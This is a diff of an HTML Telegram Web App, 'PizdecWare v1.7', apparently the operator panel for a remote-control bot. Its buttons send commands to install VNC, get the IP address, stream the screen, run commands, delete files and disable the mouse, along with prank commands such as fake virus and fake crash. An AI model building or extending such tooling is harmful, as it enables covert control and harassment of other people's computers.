@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Style PC Control Mini App</title>
+    <title>PizdecWare v1.7 Control Hub</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Bangers&display=swap" rel="stylesheet">
+    <script src="https://telegram.org/js/telegram-web-app.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.2.3/howler.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: 'Bangers', cursive;
-            background-image: url('https://images.unsplash.com/photo-1554058003-3e5e26d7d81f?auto=format&fit=crop&w=1920&q=80');
-            background-size: cover;
-            background-attachment: fixed;
+            font-family: 'Press Start 2P', monospace;
+            background: linear-gradient(135deg, #1a0a26, #4a1e6d, #7a2ea6);
+            position: relative;
+            overflow: hidden;
             color: #ffffff;
             min-height: 100vh;
             margin: 0;
@@ -21,158 +22,283 @@
             align-items: center;
         }
         .container {
-            max-width: 700px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(5px);
+            max-width: 950px;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 3px dashed #7a2ea6;
+            border-radius: 10px;
+            box-shadow: 0 0 25px rgba(122, 46, 166, 0.6);
+            position: relative;
+            z-index: 2;
+        }
+        .logo {
+            width: 200px;
+            margin: 0 auto 30px;
+            filter: drop-shadow(0 0 15px #7a2ea6);
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
         }
         .section-title {
-            @apply text-3xl mb-6 text-center text-[#00ff00] tracking-wide;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            @apply text-3xl mb-6 text-center text-[#ffffff];
+            text-shadow: 0 0 5px #7a2ea6;
+            position: relative;
+            animation: type 1.5s steps(40, end);
+        }
+        @keyframes type {
+            from { width: 0; }
+            to { width: 100%; }
         }
         .btn {
-            @apply bg-[#1b73e8] text-white py-3 px-6 rounded-lg shadow-lg hover:bg-[#ff4500] transition-all duration-300 transform hover:scale-105;
-            border: 3px solid #ffffff;
-            font-size: 1.2rem;
-            letter-spacing: 1px;
+            @apply bg-[#4a1e6d] text-[#ffffff] py-3 px-6 rounded-md shadow-inner;
+            border: 1px solid #7a2ea6;
+            font-size: 1.1rem;
+            position: relative;
+            transition: all 0.3s ease;
         }
         .btn:hover {
-            box-shadow: 0 0 15px rgba(255, 69, 0, 0.8);
+            background: #7a2ea6;
+            transform: scale(1.05);
+            box-shadow: 0 0 10px #7a2ea6;
+        }
+        .btn::after {
+            content: attr(data-command);
+            position: absolute;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.7rem;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            color: #ffffff;
+        }
+        .btn:hover::after {
+            opacity: 1;
         }
         .grid {
-            @apply grid grid-cols-1 sm:grid-cols-2 gap-4;
+            @apply grid grid-cols-1 md:grid-cols-4 gap-4;
         }
         h1 {
-            @apply text-5xl text-center mb-8 text-[#ffcc00] tracking-wider;
-            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.7);
+            @apply text-4xl text-center mb-10 text-[#ff00ff];
+            text-shadow: 0 0 8px #ff00ff;
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px, 0) skew(0deg); }
+            4%, 60% { transform: translate(-2px, 0) skew(0deg); }
+            62% { transform: translate(0, 0) skew(5deg); }
         }
         .error-message {
-            @apply text-red-500 text-center mt-4;
+            @apply text-[#ff00ff] text-center mt-4 text-sm;
+            font-family: 'Roboto Mono', monospace;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .cloud {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+            animation: moveCloud linear infinite;
+            z-index: 1;
+        }
+        @keyframes moveCloud {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(100vw, 0); }
+        }
+        .rain-drop {
+            position: absolute;
+            background: rgba(255, 0, 255, 0.4);
+            width: 1px;
+            height: 8px;
+            animation: rainFall 2s linear infinite;
+            z-index: 1;
+        }
+        @keyframes rainFall {
+            0% { transform: translateY(-100vh); }
+            100% { transform: translateY(100vh); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Roblox Style PC Control</h1>
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 100'%3E%3Cdefs%3E%3ClinearGradient id='grad' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%234a1e6d'/%3E%3Cstop offset='100%25' style='stop-color:%237a2ea6'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M20 80 L180 20 L160 40 L40 60 Z' fill='url(%23grad)' stroke='%237a2ea6' stroke-width='3'/%3E%3Ctext x='100' y='70' font-family='Press Start 2P' font-size='20' fill='%23ffffff' text-anchor='middle' dy='.3em'%3EPizdecWare v1.7%3C/text%3E%3C/svg%3E" alt="PizdecWare Logo" class="logo">
+        <h1>PizdecWare v1.7</h1>
         <div id="error-message" class="error-message hidden"></div>
 
         <div class="mb-8">
             <h2 class="section-title">Control Commands</h2>
             <div class="grid">
-                <button class="btn" onclick="sendCommand('/install_vnc')">Install VNC</button>
-                <button class="btn" onclick="sendCommand('/get_ip')">Get IP</button>
-                <button class="btn" onclick="sendCommand('/stream_screen')">Stream Screen</button>
-                <button class="btn" onclick="sendCommand('/stop_stream')">Stop Stream</button>
-                <button class="btn" onclick="sendCommand('/move_mouse')">Move Mouse</button>
-                <button class="btn" onclick="sendCommand('/click')">Click</button>
-                <button class="btn" onclick="sendCommand('/scroll')">Scroll</button>
-                <button class="btn" onclick="sendCommand('/press_key')">Press Key</button>
-                <button class="btn" onclick="sendCommand('/run_command')">Run Command</button>
-                <button class="btn" onclick="sendCommand('/list_files')">List Files</button>
-                <button class="btn" onclick="sendCommand('/delete_file')">Delete File</button>
-                <button class="btn" onclick="sendCommand('/copy_file')">Copy File</button>
-                <button class="btn" onclick="sendCommand('/open_image')">Open Image</button>
-                <button class="btn" onclick="sendCommand('/alt_tab')">Alt+Tab</button>
-                <button class="btn" onclick="sendCommand('/move_up')">Move Up</button>
-                <button class="btn" onclick="sendCommand('/move_right')">Move Right</button>
-                <button class="btn" onclick="sendCommand('/disable_mouse')">Disable Mouse</button>
-                <button class="btn" onclick="sendCommand('/screenshot')">Screenshot</button>
-                <button class="btn" onclick="sendCommand('/open_discord')">Open Discord</button>
+                <button class="btn" data-command="/install_vnc" onclick="sendCommand('/install_vnc')">Install VNC</button>
+                <button class="btn" data-command="/get_ip" onclick="sendCommand('/get_ip')">Get IP</button>
+                <button class="btn" data-command="/stream_screen" onclick="sendCommand('/stream_screen')">Stream Screen</button>
+                <button class="btn" data-command="/stop_stream" onclick="sendCommand('/stop_stream')">Stop Stream</button>
+                <button class="btn" data-command="/move_mouse" onclick="sendCommand('/move_mouse')">Move Mouse</button>
+                <button class="btn" data-command="/click" onclick="sendCommand('/click')">Click</button>
+                <button class="btn" data-command="/scroll" onclick="sendCommand('/scroll')">Scroll</button>
+                <button class="btn" data-command="/press_key" onclick="sendCommand('/press_key')">Press Key</button>
+                <button class="btn" data-command="/run_command" onclick="sendCommand('/run_command')">Run Command</button>
+                <button class="btn" data-command="/list_files" onclick="sendCommand('/list_files')">List Files</button>
+                <button class="btn" data-command="/delete_file" onclick="sendCommand('/delete_file')">Delete File</button>
+                <button class="btn" data-command="/copy_file" onclick="sendCommand('/copy_file')">Copy File</button>
+                <button class="btn" data-command="/open_image" onclick="sendCommand('/open_image')">Open Image</button>
+                <button class="btn" data-command="/alt_tab" onclick="sendCommand('/alt_tab')">Alt+Tab</button>
+                <button class="btn" data-command="/move_up" onclick="sendCommand('/move_up')">Move Up</button>
+                <button class="btn" data-command="/move_right" onclick="sendCommand('/move_right')">Move Right</button>
+                <button class="btn" data-command="/disable_mouse" onclick="sendCommand('/disable_mouse')">Disable Mouse</button>
+                <button class="btn" data-command="/screenshot" onclick="sendCommand('/screenshot')">Screenshot</button>
+                <button class="btn" data-command="/open_discord" onclick="sendCommand('/open_discord')">Open Discord</button>
             </div>
         </div>
 
         <div class="mb-8">
             <h2 class="section-title">Grok Commands</h2>
             <div class="grid">
-                <button class="btn" onclick="sendCommand('/grok')">Grok</button>
-                <button class="btn" onclick="sendCommand('/edit_code')">Edit Code</button>
-                <button class="btn" onclick="sendCommand('/update_code')">Update Code</button>
-                <button class="btn" onclick="sendCommand('/restart_bot')">Restart Bot</button>
+                <button class="btn" data-command="/grok" onclick="sendCommand('/grok')">Grok</button>
+                <button class="btn" data-command="/edit_code" onclick="sendCommand('/edit_code')">Edit Code</button>
+                <button class="btn" data-command="/update_code" onclick="sendCommand('/update_code')">Update Code</button>
+                <button class="btn" data-command="/restart_bot" onclick="sendCommand('/restart_bot')">Restart Bot</button>
             </div>
         </div>
 
         <div>
             <h2 class="section-title">Trolling Commands</h2>
             <div class="grid">
-                <button class="btn" onclick="sendCommand('/troll_sound1')">Sound Error</button>
-                <button class="btn" onclick="sendCommand('/troll_sound2')">Sound Notification</button>
-                <button class="btn" onclick="sendCommand('/troll_sound3')">Sound Ring</button>
-                <button class="btn" onclick="sendCommand('/troll_random_move')">Random Move</button>
-                <button class="btn" onclick="sendCommand('/troll_open_rickroll')">Open Rickroll</button>
-                <button class="btn" onclick="sendCommand('/troll_open_meme')">Open Meme</button>
-                <button class="btn" onclick="sendCommand('/troll_open_cat')">Open Cat</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_hack')">Fake Hack</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_error')">Fake Error</button>
-                <button class="btn" onclick="sendCommand('/troll_type_joke')">Type Joke</button>
-                <button class="btn" onclick="sendCommand('/troll_open_notepad')">Open Notepad</button>
-                <button class="btn" onclick="sendCommand('/troll_volume_up')">Volume Up</button>
-                <button class="btn" onclick="sendCommand('/troll_volume_down')">Volume Down</button>
-                <button class="btn" onclick="sendCommand('/troll_capslock')">Caps Lock</button>
-                <button class="btn" onclick="sendCommand('/troll_random_click')">Random Click</button>
-                <button class="btn" onclick="sendCommand('/troll_open_calculator')">Open Calculator</button>
-                <button class="btn" onclick="sendCommand('/troll_open_paint')">Open Paint</button>
-                <button class="btn" onclick="sendCommand('/troll_minimize_all')">Minimize All</button>
-                <button class="btn" onclick="sendCommand('/troll_maximize')">Maximize</button>
-                <button class="btn" onclick="sendCommand('/troll_type_chaos')">Type Chaos</button>
-                <button class="btn" onclick="sendCommand('/troll_open_youtube')">Open YouTube</button>
-                <button class="btn" onclick="sendCommand('/troll_open_browser')">Open Browser</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_update')">Fake Update</button>
-                <button class="btn" onclick="sendCommand('/troll_mouse_circle')">Mouse Circle</button>
-                <button class="btn" onclick="sendCommand('/troll_sound_loop')">Sound Loop</button>
-                <button class="btn" onclick="sendCommand('/troll_open_sticky')">Open Sticky</button>
-                <button class="btn" onclick="sendCommand('/troll_type_rickroll')">Type Rickroll</button>
-                <button class="btn" onclick="sendCommand('/troll_open_cmd')">Open CMD</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_shutdown')">Fake Shutdown</button>
-                <button class="btn" onclick="sendCommand('/troll_mouse_zigzag')">Mouse Zigzag</button>
-                <button class="btn" onclick="sendCommand('/troll_open_explorer')">Open Explorer</button>
-                <button class="btn" onclick="sendCommand('/troll_sound_ding')">Sound Ding</button>
-                <button class="btn" onclick="sendCommand('/troll_type_meme')">Type Meme</button>
-                <button class="btn" onclick="sendCommand('/troll_open_clock')">Open Clock</button>
-                <button class="btn" onclick="sendCommand('/troll_random_scroll')">Random Scroll</button>
-                <button class="btn" onclick="sendCommand('/troll_open_photos')">Open Photos</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_virus')">Fake Virus</button>
-                <button class="btn" onclick="sendCommand('/troll_mouse_jump')">Mouse Jump</button>
-                <button class="btn" onclick="sendCommand('/troll_open_control')">Open Control</button>
-                <button class="btn" onclick="sendCommand('/troll_sound_beep')">Sound Beep</button>
-                <button class="btn" onclick="sendCommand('/troll_type_nonsense')">Type Nonsense</button>
-                <button class="btn" onclick="sendCommand('/troll_open_settings')">Open Settings</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_crash')">Fake Crash</button>
-                <button class="btn" onclick="sendCommand('/troll_mouse_shake')">Mouse Shake</button>
-                <button class="btn" onclick="sendCommand('/troll_open_taskmgr')">Open Task Manager</button>
-                <button class="btn" onclick="sendCommand('/troll_sound_alert')">Sound Alert</button>
-                <button class="btn" onclick="sendCommand('/troll_type_emoji')">Type Emoji</button>
-                <button class="btn" onclick="sendCommand('/troll_open_snip')">Open Snip</button>
-                <button class="btn" onclick="sendCommand('/troll_fake_battery')">Fake Battery</button>
-                <button class="btn" onclick="sendCommand('/troll_mouse_random')">Mouse Random</button>
-                <button class="btn" onclick="sendCommand('/troll_open_weather')">Open Weather</button>
-                <button class="btn" onclick="sendCommand('/troll_sound_chime')">Sound Chime</button>
+                <button class="btn" data-command="/troll_sound1" onclick="sendCommand('/troll_sound1')">Sound Error</button>
+                <button class="btn" data-command="/troll_sound2" onclick="sendCommand('/troll_sound2')">Sound Notification</button>
+                <button class="btn" data-command="/troll_sound3" onclick="sendCommand('/troll_sound3')">Sound Ring</button>
+                <button class="btn" data-command="/troll_random_move" onclick="sendCommand('/troll_random_move')">Random Move</button>
+                <button class="btn" data-command="/troll_open_rickroll" onclick="sendCommand('/troll_open_rickroll')">Open Rickroll</button>
+                <button class="btn" data-command="/troll_open_meme" onclick="sendCommand('/troll_open_meme')">Open Meme</button>
+                <button class="btn" data-command="/troll_open_cat" onclick="sendCommand('/troll_open_cat')">Open Cat</button>
+                <button class="btn" data-command="/troll_fake_hack" onclick="sendCommand('/troll_fake_hack')">Fake Hack</button>
+                <button class="btn" data-command="/troll_fake_error" onclick="sendCommand('/troll_fake_error')">Fake Error</button>
+                <button class="btn" data-command="/troll_type_joke" onclick="sendCommand('/troll_type_joke')">Type Joke</button>
+                <button class="btn" data-command="/troll_open_notepad" onclick="sendCommand('/troll_open_notepad')">Open Notepad</button>
+                <button class="btn" data-command="/troll_volume_up" onclick="sendCommand('/troll_volume_up')">Volume Up</button>
+                <button class="btn" data-command="/troll_volume_down" onclick="sendCommand('/troll_volume_down')">Volume Down</button>
+                <button class="btn" data-command="/troll_capslock" onclick="sendCommand('/troll_capslock')">Caps Lock</button>
+                <button class="btn" data-command="/troll_random_click" onclick="sendCommand('/troll_random_click')">Random Click</button>
+                <button class="btn" data-command="/troll_open_calculator" onclick="sendCommand('/troll_open_calculator')">Open Calculator</button>
+                <button class="btn" data-command="/troll_open_paint" onclick="sendCommand('/troll_open_paint')">Open Paint</button>
+                <button class="btn" data-command="/troll_minimize_all" onclick="sendCommand('/troll_minimize_all')">Minimize All</button>
+                <button class="btn" data-command="/troll_maximize" onclick="sendCommand('/troll_maximize')">Maximize</button>
+                <button class="btn" data-command="/troll_type_chaos" onclick="sendCommand('/troll_type_chaos')">Type Chaos</button>
+                <button class="btn" data-command="/troll_open_youtube" onclick="sendCommand('/troll_open_youtube')">Open YouTube</button>
+                <button class="btn" data-command="/troll_open_browser" onclick="sendCommand('/troll_open_browser')">Open Browser</button>
+                <button class="btn" data-command="/troll_fake_update" onclick="sendCommand('/troll_fake_update')">Fake Update</button>
+                <button class="btn" data-command="/troll_mouse_circle" onclick="sendCommand('/troll_mouse_circle')">Mouse Circle</button>
+                <button class="btn" data-command="/troll_sound_loop" onclick="sendCommand('/troll_sound_loop')">Sound Loop</button>
+                <button class="btn" data-command="/troll_open_sticky" onclick="sendCommand('/troll_open_sticky')">Open Sticky</button>
+                <button class="btn" data-command="/troll_type_rickroll" onclick="sendCommand('/troll_type_rickroll')">Type Rickroll</button>
+                <button class="btn" data-command="/troll_open_cmd" onclick="sendCommand('/troll_open_cmd')">Open CMD</button>
+                <button class="btn" data-command="/troll_fake_shutdown" onclick="sendCommand('/troll_fake_shutdown')">Fake Shutdown</button>
+                <button class="btn" data-command="/troll_mouse_zigzag" onclick="sendCommand('/troll_mouse_zigzag')">Mouse Zigzag</button>
+                <button class="btn" data-command="/troll_open_explorer" onclick="sendCommand('/troll_open_explorer')">Open Explorer</button>
+                <button class="btn" data-command="/troll_sound_ding" onclick="sendCommand('/troll_sound_ding')">Sound Ding</button>
+                <button class="btn" data-command="/troll_type_meme" onclick="sendCommand('/troll_type_meme')">Type Meme</button>
+                <button class="btn" data-command="/troll_open_clock" onclick="sendCommand('/troll_open_clock')">Open Clock</button>
+                <button class="btn" data-command="/troll_random_scroll" onclick="sendCommand('/troll_random_scroll')">Random Scroll</button>
+                <button class="btn" data-command="/troll_open_photos" onclick="sendCommand('/troll_open_photos')">Open Photos</button>
+                <button class="btn" data-command="/troll_fake_virus" onclick="sendCommand('/troll_fake_virus')">Fake Virus</button>
+                <button class="btn" data-command="/troll_mouse_jump" onclick="sendCommand('/troll_mouse_jump')">Mouse Jump</button>
+                <button class="btn" data-command="/troll_open_control" onclick="sendCommand('/troll_open_control')">Open Control</button>
+                <button class="btn" data-command="/troll_sound_beep" onclick="sendCommand('/troll_sound_beep')">Sound Beep</button>
+                <button class="btn" data-command="/troll_type_nonsense" onclick="sendCommand('/troll_type_nonsense')">Type Nonsense</button>
+                <button class="btn" data-command="/troll_open_settings" onclick="sendCommand('/troll_open_settings')">Open Settings</button>
+                <button class="btn" data-command="/troll_fake_crash" onclick="sendCommand('/troll_fake_crash')">Fake Crash</button>
+                <button class="btn" data-command="/troll_mouse_shake" onclick="sendCommand('/troll_mouse_shake')">Mouse Shake</button>
+                <button class="btn" data-command="/troll_open_taskmgr" onclick="sendCommand('/troll_open_taskmgr')">Open Task Manager</button>
+                <button class="btn" data-command="/troll_sound_alert" onclick="sendCommand('/troll_sound_alert')">Sound Alert</button>
+                <button class="btn" data-command="/troll_type_emoji" onclick="sendCommand('/troll_type_emoji')">Type Emoji</button>
+                <button class="btn" data-command="/troll_open_snip" onclick="sendCommand('/troll_open_snip')">Open Snip</button>
+                <button class="btn" data-command="/troll_fake_battery" onclick="sendCommand('/troll_fake_battery')">Fake Battery</button>
+                <button class="btn" data-command="/troll_mouse_random" onclick="sendCommand('/troll_mouse_random')">Mouse Random</button>
+                <button class="btn" data-command="/troll_open_weather" onclick="sendCommand('/troll_open_weather')">Open Weather</button>
+                <button class="btn" data-command="/troll_sound_chime" onclick="sendCommand('/troll_sound_chime')">Sound Chime</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Проверка готовности Telegram Web App
-        if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-            Telegram.WebApp.ready();
-            Telegram.WebApp.expand();
-            Telegram.WebApp.setHeaderColor('#1b73e8');
-            Telegram.WebApp.setBackgroundColor('#1b73e8');
-
-            function sendCommand(command) {
-                try {
-                    Telegram.WebApp.sendData(command);
-                    Telegram.WebApp.close();
-                } catch (e) {
-                    document.getElementById('error-message').innerText = 'Ошибка отправки команды: ' + e.message;
-                    document.getElementById('error-message').classList.remove('hidden');
-                }
+        // Дождь
+        function createRain() {
+            const rain = document.createElement('div');
+            rain.className = 'rain';
+            document.body.appendChild(rain);
+            for (let i = 0; i < 30; i++) {
+                const drop = document.createElement('div');
+                drop.className = 'rain-drop';
+                drop.style.left = Math.random() * 100 + 'vw';
+                drop.style.animationDuration = Math.random() * 1.5 + 1 + 's';
+                rain.appendChild(drop);
             }
-        } else {
-            document.getElementById('error-message').innerText = 'Telegram Web App не инициализирован. Пожалуйста, откройте через Telegram.';
-            document.getElementById('error-message').classList.remove('hidden');
         }
+        createRain();
+
+        // Облака
+        function createClouds() {
+            for (let i = 0; i < 2; i++) {
+                const cloud = document.createElement('div');
+                cloud.className = 'cloud';
+                cloud.style.width = Math.random() * 120 + 80 + 'px';
+                cloud.style.height = Math.random() * 40 + 20 + 'px';
+                cloud.style.top = Math.random() * 20 + 'vh';
+                cloud.style.left = Math.random() * -150 + 'vw';
+                cloud.style.animationDuration = Math.random() * 30 + 50 + 's';
+                document.body.appendChild(cloud);
+            }
+        }
+        createClouds();
+
+        // Звуки с локальным резервом
+        const beepSound = new Howl({
+            src: ['https://www.myinstants.com/media/sounds/beep-02.mp3', 'data:audio/mp3;base64,//M...'], // Замените на баз64-данные или оставьте как есть
+            volume: 0.4,
+            onloaderror: () => console.log('Sound failed to load, using silent fallback')
+        });
+        document.querySelectorAll('.btn').forEach(button => {
+            button.addEventListener('click', () => {
+                beepSound.play().catch(() => {});
+                button.style.color = '#ff00ff';
+                setTimeout(() => button.style.color = '#ffffff', 200);
+            });
+        });
+
+        // Telegram Web App с проверкой
+        function initTelegram() {
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
+                Telegram.WebApp.setHeaderColor('#4a1e6d');
+                Telegram.WebApp.setBackgroundColor('#1a0a26');
+
+                window.sendCommand = (command) => {
+                    try {
+                        Telegram.WebApp.sendData(command);
+                        Telegram.WebApp.close();
+                    } catch (e) {
+                        document.getElementById('error-message').innerText = 'Error: ' + e.message;
+                        document.getElementById('error-message').classList.remove('hidden');
+                    }
+                };
+            } else {
+                document.getElementById('error-message').innerText = 'Run via Telegram';
+                document.getElementById('error-message').classList.remove('hidden');
+                setTimeout(initTelegram, 500); // Повторная попытка
+            }
+        }
+        initTelegram();
+
+        // Адаптация
+        window.addEventListener('resize', () => {
+            document.querySelectorAll('.rain, .rain-drop, .cloud').forEach(el => el.remove());
+            createRain();
+            createClouds();
+        });
     </script>
 </body>
 </html>
